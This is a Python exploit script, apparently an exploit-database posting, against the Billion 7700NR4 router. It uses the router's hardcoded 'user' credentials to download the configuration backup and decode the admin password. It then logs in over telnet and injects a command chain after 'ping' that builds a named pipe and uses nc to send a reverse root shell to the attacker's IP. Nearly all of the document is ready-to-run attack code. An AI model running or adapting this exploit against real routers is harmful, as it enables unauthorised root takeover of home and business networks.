# Title : Billion Router 7700NR4 Remote Root Command Execution
# Date : 06/10/2016
# Author : R-73eN
# Tested on: Billion Router 7700NR4 
# Vendor : http://www.billion.com/
# Vulnerability Description:
# This router is a widely used here in Albania. It is given by a telecom provider to the home and bussiness users.
# The problem is that this router has hardcoded credentials which "can not be changed" by a normal user. Using these 
# credentials we don't have to much access but the lack of authentication security we can download the backup and get the admin password.
# Using that password we can login to telnet server and use a shell escape to get a reverse root connection.
# You must change host with the target and reverse_ip with your attacking ip.
# Fix:
# The only fix is hacking your router with this exploit, changing the credentials and disabling all the other services using iptables. 
#

import requests
import base64
import socket
import time

host = ""
def_user = "user"
def_pass = "user"
reverse_ip = ""
#Banner
banner = ""
banner +="  ___        __        ____                 _    _  \n"
banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
print banner


# limited shell escape
evil = 'ping ;rm /tmp/backpipe;cd tmp;echo "mknod backpipe p && nc ' + reverse_ip  + ' 1337 0<backpipe | /bin/sh 1>backpipe &" > /tmp/rev.sh;chmod +x rev.sh;sh /tmp/rev.sh &'

def execute_payload(password):
	print "[+] Please run nc -lvp 1337 and then press any key [+]"
	raw_input()
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,23))
	s.recv(1024)
	s.send("admin\r")
	a= s.recv(1024)
	time.sleep(1)
	s.send(password +"\r")
	time.sleep(1)
	s.recv(1024)
	s.send(evil + "\r")
	time.sleep(1)
	print "[+] If everything worked you should get a reverse shell [+]"
	print "[+] Warning pressing any key will close the SHELL [+]"
	raw_input()




r = requests.get("http://" + host + "/backupsettings.conf" , auth=(def_user,def_pass))
if(r.status_code == 200):
	print "[+] Seems the exploit worked [+]"
	print "[+] Dumping data . . . [+]"
	temp = r.text
	admin_pass = temp.split("<AdminPassword>")[1].split("</AdminPassword>")[0]
#	print "[+] Admin password : " + str(base64.b64decode(admin_pass)) + " [+]"
	execute_payload(str(base64.b64decode(admin_pass)))
else:
	print "[-] Exploit Failed [-]"
print "\n[+] https://www.infogen.al/ [+]\n\n"
